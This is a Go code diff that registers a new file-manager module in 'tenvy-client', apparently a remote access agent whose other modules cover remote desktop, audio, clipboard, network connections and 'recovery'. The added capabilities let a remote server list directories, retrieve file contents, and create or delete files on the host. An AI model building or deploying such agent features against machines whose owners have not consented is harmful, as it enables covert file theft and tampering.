@@ -13,6 +13,7 @@ import (
 	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
 	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
 	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
+	filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
 	tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
 	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
 	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
@@ -68,6 +69,7 @@ func newDefaultModuleRegistry() *moduleRegistry {
 	registry.register(&remoteDesktopModule{})
 	registry.register(&audioModule{})
 	registry.register(&clipboardModule{})
+	registry.register(&fileManagerModule{})
 	registry.register(&tcpConnectionsModule{})
 	registry.register(&clientChatModule{})
 	registry.register(&recoveryModule{})
@@ -347,6 +349,62 @@ func (m *clipboardModule) Shutdown(context.Context) {
 	if m.manager != nil {
 		m.manager.Shutdown()
 	}
+}
+
+type fileManagerModule struct {
+	manager *filemanager.Manager
+}
+
+func (m *fileManagerModule) Metadata() ModuleMetadata {
+	return ModuleMetadata{
+		ID:          "file-manager",
+		Title:       "File Manager",
+		Description: "Inspect and manage the remote file system.",
+		Commands:    []string{"file-manager"},
+		Capabilities: []ModuleCapability{
+			{
+				Name:        "file-manager.explore",
+				Description: "Enumerate directories and retrieve file contents from the host.",
+			},
+			{
+				Name:        "file-manager.modify",
+				Description: "Create, update, move, and delete files and directories on demand.",
+			},
+		},
+	}
+}
+
+func (m *fileManagerModule) Update(runtime moduleRuntime) error {
+	cfg := filemanager.Config{
+		AgentID:   runtime.AgentID,
+		BaseURL:   runtime.BaseURL,
+		AuthKey:   runtime.AuthKey,
+		Client:    runtime.HTTPClient,
+		Logger:    runtime.Logger,
+		UserAgent: runtime.UserAgent,
+	}
+	if m.manager == nil {
+		m.manager = filemanager.NewManager(cfg)
+		return nil
+	}
+	m.manager.UpdateConfig(cfg)
+	return nil
+}
+
+func (m *fileManagerModule) HandleCommand(ctx context.Context, cmd protocol.Command) protocol.CommandResult {
+	if m.manager == nil {
+		return protocol.CommandResult{
+			CommandID:   cmd.ID,
+			Success:     false,
+			Error:       "file manager subsystem not initialized",
+			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
+		}
+	}
+	return m.manager.HandleCommand(ctx, cmd)
+}
+
+func (m *fileManagerModule) Shutdown(context.Context) {
+	// no teardown required for file system operations today
 }
 
 type tcpConnectionsModule struct {
